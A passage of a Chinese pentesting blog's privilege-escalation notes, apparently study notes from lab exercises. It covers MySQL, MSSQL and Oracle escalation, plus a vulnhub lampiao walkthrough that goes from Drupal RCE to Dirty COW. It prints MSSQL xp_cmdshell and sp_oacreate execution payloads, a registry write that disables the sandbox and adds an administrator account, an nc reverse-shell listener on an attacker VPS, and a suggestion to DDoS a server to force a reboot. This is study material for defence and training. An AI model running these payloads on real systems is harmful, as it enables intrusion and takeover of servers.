<p>补充这里的START FOLDER启动项目录可以修改</p>
<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&MS&ORA%E7%AD%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20220303001722796.png" alt="image-20220303001722796"></p>
<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&MS&ORA%E7%AD%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20220303001730991.png" alt="image-20220303001730991"></p>
<p>服务器重启后就会加载这个文件</p>
<p>要使自启动实现，可以使用DDOS，使服务器宕机重启</p>
<h3 id="反弹提权"><a href="#反弹提权" class="headerlink" title="反弹提权"></a>反弹提权</h3><p>自己的VPS端开<code>nc -l -p 5577</code>监听，然后利用root权限反弹系统shell，这里反弹需要用到前面udf提权的.dll库里的函数来完成</p>
<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&MS&ORA%E7%AD%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20220303004342561.png" alt="image-20220303004342561"></p>
<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&MS&ORA%E7%AD%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/image-20220303004405533.png" alt="image-20220303004405533"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/bylfsj/article/details/105144445">Windows下三种mysql提权</a></p>
<h2 id="mssql数据库提权-链接客户端"><a href="#mssql数据库提权-链接客户端" class="headerlink" title="mssql数据库提权-链接客户端"></a>mssql数据库提权-链接客户端</h2><h3 id="使用xp-cmdshell提权"><a href="#使用xp-cmdshell提权" class="headerlink" title="使用xp_cmdshell提权"></a>使用xp_cmdshell提权</h3><p>xp_cmdshell默认在<strong>mssql2000</strong>中开启，在<strong>mssql2005</strong>之后版本中默认禁用，如果用户拥有管理员sa权限则可以用sp_configure重新开启它</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* 启用 */</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdeshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">/* 关闭 */</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdeshell&#x27;, 0;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">/* 执行 */</span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;</span><br><span class="line"></span><br><span class="line">/* 若xp_cmdshell被删除了可以上传xplog70.dll进行恢复 */</span><br><span class="line">EXEC master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="使用sp-oacreate提权"><a href="#使用sp-oacreate提权" class="headerlink" title="使用sp_oacreate提权"></a>使用sp_oacreate提权</h3><p>主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* 启用 */</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* 关闭 */</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 0;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"></span><br><span class="line">/* 执行 */</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="使用SQL-Server-沙盒提权"><a href="#使用SQL-Server-沙盒提权" class="headerlink" title="使用SQL Server 沙盒提权"></a>使用SQL Server 沙盒提权</h3><p>沙盒：沙盒通常严格控制其中的程序所能访问的资源，比如，沙盒可以提供用后即回收的磁盘及内存空间。在沙盒中，网络访问、对真实系统的访问、对输入设备的读取通常被禁止或是严格限制。从这个角度来说，沙盒属于<a href="https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E5%8C%96">虚拟化</a>的一种。沙盒中的所有改动对<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>不会造成任何损失。通常，这种技术被<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a>技术人员广泛用于测试可能带毒的程序或是其他的<a href="https://baike.baidu.com/item/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81">恶意代码</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--提权语句</span><br><span class="line"></span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line"></span><br><span class="line">-- 不开启的话在执行xp_regwrite会提示让我们开启，</span><br><span class="line"></span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br><span class="line"></span><br><span class="line">--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span><br><span class="line"></span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br><span class="line"></span><br><span class="line">--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span><br><span class="line"></span><br><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;, &#x27;SandBoxMode&#x27;</span><br><span class="line"></span><br><span class="line">--执行系统命令</span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;)</span><br><span class="line"></span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net localgroup administrators margin /add&quot;)&#x27;)</span><br><span class="line"></span><br><span class="line">沙盒模式SandBoxMode参数含义（默认是2）</span><br><span class="line"></span><br><span class="line">`0`：在任何所有者中禁止启用安全模式</span><br><span class="line"></span><br><span class="line">`1` ：为仅在允许范围内</span><br><span class="line"></span><br><span class="line">`2` ：必须在access模式下</span><br><span class="line"></span><br><span class="line">`3`：完全开启</span><br><span class="line"></span><br><span class="line">openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。</span><br><span class="line"></span><br><span class="line">--恢复配置</span><br><span class="line"></span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1;</span><br><span class="line"></span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,0;reconfigure;</span><br><span class="line"></span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;</span><br></pre></td></tr></table></figure>



<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.51cto.com/u_11797152/2411770">SQL Server提权方法汇总（MSSQL）</a></p>
<h2 id="Oracle数据库提权-自动化工具"><a href="#Oracle数据库提权-自动化工具" class="headerlink" title="Oracle数据库提权-自动化工具"></a>Oracle数据库提权-自动化工具</h2><p>oracle和jsp搭建的网站无需提权 再带system权限（jsp网站）</p>
<p>工具：<a href="https://www.cnblogs.com/rebeyond/p/7928887.html">oracleshell by rebeyond</a></p>
<h3 id="普通用户模式："><a href="#普通用户模式：" class="headerlink" title="普通用户模式："></a>普通用户模式：</h3><p>前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。</p>
<h3 id="DBA用户模式：（自动化工具）"><a href="#DBA用户模式：（自动化工具）" class="headerlink" title="DBA用户模式：（自动化工具）"></a>DBA用户模式：（自动化工具）</h3><p>拥有DBA账号密码，可以省去自己动手创建存储过程的繁琐步骤，一件执行测试。</p>
<h3 id="注入提升模式：（sqlmap）"><a href="#注入提升模式：（sqlmap）" class="headerlink" title="注入提升模式：（sqlmap）"></a>注入提升模式：（sqlmap）</h3><p>拥有一个oracle诸如点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证</p>
]]></content>
      <categories>
        <category>权限提升</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>数据库提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis&amp;Postgre</title>
    <url>/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&amp;Postgre/</url>
    <content><![CDATA[<p><img src="/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&Postgre/image-20220303221213861.png" alt="image-20220303221213861"></p>
<p><img src="/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&Postgre/image-20220303232856998.png" alt="image-20220303232856998"></p>
<p><a href="https://www.jianshu.com/p/fd7b422d5f93">简述关系型数据库和非关系型数据库</a></p>
<p><a href="https://blog.csdn.net/fly_hps/article/details/80937837">Redis未授权访问漏洞利用总结</a></p>
<p><a href="https://vulhub.org/#/environments/postgres/CVE-2018-1058/">https://vulhub.org/#/environments/postgres/CVE-2018-1058/</a></p>
<p><a href="https://vulhub.org/#/environments/postgres/CVE-2019-9193/">https://vulhub.org/#/environments/postgres/CVE-2019-9193/</a></p>
]]></content>
      <categories>
        <category>权限提升</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>数据库提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux脏牛内核漏洞&amp;SUID&amp;信息收集</title>
    <url>/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&amp;SUID&amp;%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220304131412193.png" alt="image-20220304131412193"></p>
<h2 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h2><p>两个信息收集：<a href="https://github.com/rebootuser/LinEnum">LinEnum</a> <a href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker</a></p>
<p>两个漏洞探针（用于检测内核漏洞）：<a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a> <a href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester2</a></p>
<h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><p><strong>SUID概念：</strong>SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。</p>
<p><strong>一般思路：</strong>拿到webll后，上传信息收集脚本，查看是否存在suid提权（一般上传至/tmp文件夹内，因为该目录一般是可读写可执行的，上传至其他目录以获得的权限可能会无法成功完成相关操作），若上传后没有执行权限使用<code>chmod +x 文件名</code>来使其可执行。当找到可利用的有SUID的全局命令（参考文章中有具体的那几种可以利用）使用对应的方法就可提权</p>
<p>参考</p>
<p><a href="https://pentestlab.blog/2017/09/25/suid-executables/">SUID Executables – Penetration Testing Lab</a></p>
<p><a href="https://blog.csdn.net/qq_36119192/article/details/84872644">Linux下用SUID提权</a></p>
<h2 id="Linux本地提权-内核漏洞-Mozhe靶场"><a href="#Linux本地提权-内核漏洞-Mozhe靶场" class="headerlink" title="Linux本地提权-内核漏洞-Mozhe靶场"></a>Linux本地提权-内核漏洞-Mozhe靶场</h2><p>提权过程：连接ssh-&gt;上漏洞探针脚本进行漏洞探测-&gt;下载上传EXP-&gt;编译并执行EXP-&gt;提权成功</p>
<p>靶场地址：<a href="https://www.mozhe.cn/bug/detail/201">Ubuntu 16.04漏洞复现(CVE-2017-16995)</a></p>
<p>1.连接</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220304232831025.png" alt="image-20220304232831025"></p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220304232849754.png" alt="image-20220304232849754"></p>
<p><a href="https://blog.csdn.net/ximenjianxue/article/details/103127383?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-2-103127383.pc_agg_new_rank&utm_term=Linux%E7%94%A8%E6%88%B7uid%E8%8C%83%E5%9B%B4&spm=1000.2123.3001.4430">Linux用户不同UID分类区别</a></p>
<p>2.上漏洞探针脚本发现对应漏洞</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220304233859374.png" alt="image-20220304233859374"></p>
<p>3.下载上传EXP</p>
<p><a href="http://www.exploit-db.com/exploits/45010">http://www.exploit-db.com/exploits/45010</a></p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220304234734592.png" alt="image-20220304234734592"></p>
<p>4.编译并执行EXP</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220304235030359.png" alt="image-20220304235030359"></p>
<p>flag在根目录下的key.txt文件内（该文件需要root权限访问）</p>
<h2 id="Linux提权-脏牛内核漏洞"><a href="#Linux提权-脏牛内核漏洞" class="headerlink" title="Linux提权-脏牛内核漏洞"></a>Linux提权-脏牛内核漏洞</h2><p>提权过程：vulnhub靶机-探针目标-cms漏洞利用-脚本探针提权漏洞（利用linux_exploit_suggester）-利用内核漏洞提权</p>
<p><a href="https://blog.csdn.net/shuair/article/details/106088292">IP地址、子网掩码、192.168.1.0/24是什么意思</a></p>
<p>1.用nmap扫描C段<code>nmap 192.168.184.0/24</code></p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220305223450492.png" alt="image-20220305223450492"></p>
<p>访问结果如下：</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220305223816848.png" alt="image-20220305223816848"></p>
<p>2.确定目标ip地址192.168.184.139，继续对目标的端口开放进行扫描<code>nmap 192.168.184.139 -p1-65535</code></p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220305224126113.png" alt="image-20220305224126113"></p>
<p>访问1898端口</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220305224211335.png" alt="image-20220305224211335"></p>
<p>3.访问robots.txt</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220305231928009.png" alt="image-20220305231928009"></p>
<p>随便访问一个目录，存在目录泄露+文件读取</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220305232042566.png" alt="image-20220305232042566"></p>
<p>但翻了半天没找到敏感信息</p>
<p>回到robots.txt再看看，有个install.php但是无法利用，需要清空数据库</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220305232323885.png" alt="image-20220305232323885"></p>
<p>然后发现了一个CHANGELOG.txt，知道这是一个Drupal 7.54搭建的</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220305232450310.png" alt="image-20220305232450310"></p>
<p>利用Wappalyzer也可以证实</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220305232546106.png" alt="image-20220305232546106"></p>
<p>4.寻求CMS漏洞</p>
<p>百度Drupal 7.54相关漏洞</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220305232630328.png" alt="image-20220305232630328"></p>
<p>应该会是RCE漏洞</p>
<p>5.利用MSF搜索Drupal寻找RCE相关漏洞</p>
<p>更具百度结果可能是CVE-2018-7600，故选择这个2018年的exp</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220305233433225.png" alt="image-20220305233433225"></p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220305234130106.png" alt="image-20220305234130106"></p>
<p>接收到会话，查看权限，是www-data，权限还很低应该需要提权</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220305234239199.png" alt="image-20220305234239199"></p>
<p>6.上漏洞探针脚本</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220306001111006.png" alt="image-20220306001111006"></p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220306001133746.png" alt="image-20220306001133746"></p>
<p>提权先从内核版本下手，查看内核版本，先启一个shell，然后执行<code>uname -a</code></p>
<p>得到信息如下，<strong>Linux为2016年7月更新，可以使用脏牛进行提权</strong> <strong>CVE-2016-5195脏牛漏洞范围：Linux kernel&gt;2.6.22</strong> (2007年发行，到2016年10月18日才修复)</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220305235926577.png" alt="image-20220305235926577"></p>
<p>7.下载exp进行编译，然后上传运行进行提权</p>
<p>另起一个终端在本地下载exp</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220306005440324.png" alt="image-20220306005440324"></p>
<p>8.再上传至受害端编译执行提权</p>
<p>这里编译语句<code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</code></p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220306005517923.png" alt="image-20220306005517923"></p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220306005604620.png" alt="image-20220306005604620"></p>
<p>执行提权</p>
<p>这里需要注意，要利用python开启一个交互式shell<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>，在执行exp提权</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220306005619765.png" alt="image-20220306005619765"></p>
<p>之后给执行权限运行exp，登录root</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220306005814568.png" alt="image-20220306005814568"></p>
<p>9.到/root目录下获得flag</p>
<p><img src="/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&SUID&%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220306005924978.png" alt="image-20220306005924978"></p>
<p>到此渗透结束</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.secpulse.com/archives/152894.html">lampiao靶机渗透</a></p>
<p><a href="https://www.cnblogs.com/-chenxs/p/11767429.html">对vulnhub靶机lampiao的getshell到脏牛提权获取flag</a></p>
<p><a href="https://blog.csdn.net/gaily123/article/details/82976060">基于lampiao渗透测试的学习笔记</a></p>
<p>学会使用<a href="https://github.com/rebeyond/Behinder/releases">冰蝎</a></p>
]]></content>
      <categories>
        <category>权限提升</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>linux提权</tag>
      </tags>
  </entry>
  <entry>
    <title>令牌窃取&amp;进程注入</title>
    <url>/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96&amp;%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="Windows2008-amp-7令牌窃取-本地"><a href="#Windows2008-amp-7令牌窃取-本地" class="headerlink" title="Windows2008&amp;7令牌窃取-本地"></a>Windows2008&amp;7令牌窃取-本地</h2><p><a href="https://cloud.tencent.com/developer/article/1752172">Windows - 令牌窃取原理及利用</a>这篇文章讲的窃取令牌并不是提权，因为低权限用户只能窃取当前用户本身</p>
<p><a href="https://hackergu.com/powerup-stealtoken-rottenpotato/">权限提升篇-令牌窃取与烂土豆提权 (hackergu.com)</a></p>
<h2 id="Windows2003-amp-10进程注入提权-本地"><a href="#Windows2003-amp-10进程注入提权-本地" class="headerlink" title="Windows2003&amp;10进程注入提权-本地"></a>Windows2003&amp;10进程注入提权-本地</h2><p><a href="https://www.cnblogs.com/LittleHann/p/6336950.html">Windows Process Injection（Windows进程注入）技术研究</a></p>
]]></content>
      <categories>
        <category>权限提升</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>本地提权</tag>
        <tag>win提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Win溢出漏洞及AT&amp;SC&amp;PS提权</title>
    <url>/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&amp;SC&amp;PS%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235230607.png" alt="image-20220228235230607"></p>
<h2 id="知识必备点"><a href="#知识必备点" class="headerlink" title="知识必备点"></a>知识必备点</h2><p>用户及用户组权限划分</p>
<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235812582.png" alt="image-20220228235812582"></p>
<p>Windows提权命令</p>
<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235539073.png" alt="image-20220228235539073"></p>
<h2 id="如何判断哪种溢出漏洞，漏洞哪里找"><a href="#如何判断哪种溢出漏洞，漏洞哪里找" class="headerlink" title="如何判断哪种溢出漏洞，漏洞哪里找"></a>如何判断哪种溢出漏洞，漏洞哪里找</h2><p>流程：信息搜集-&gt;补丁筛选-&gt;利用msf或特定exp执行-&gt;提权成功</p>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>一开始使用systeminfo查看当前系统信息，获取补丁编号</p>
<h3 id="补丁筛选"><a href="#补丁筛选" class="headerlink" title="补丁筛选"></a>补丁筛选</h3><p>vulmap，Wes，WindowsVulnScan工具（后两个好用）</p>
<p>对于vulmap来说，web很难能执行.ps1文件，所以webshell实用性不佳</p>
<p>Wes和WindowsVulnScan，本质是比较windows系统版本、systeminfo补丁信息来查看漏洞利用情况。</p>
<p>这里注意WindowsVulnScan， 也需要执行一个.sp1的文件，但这个文件其实也就是和systeminfo做的相同的工作，只是生成了一个KB.json文件，我们可以自行在webshell里执行systeminfo然后改成和KB.json里一样的格式，然后在本机用该工具对改好的KB.json扫描，若扫描时报错可能是KB.json文件编码有问题，需要改成UTF-8</p>
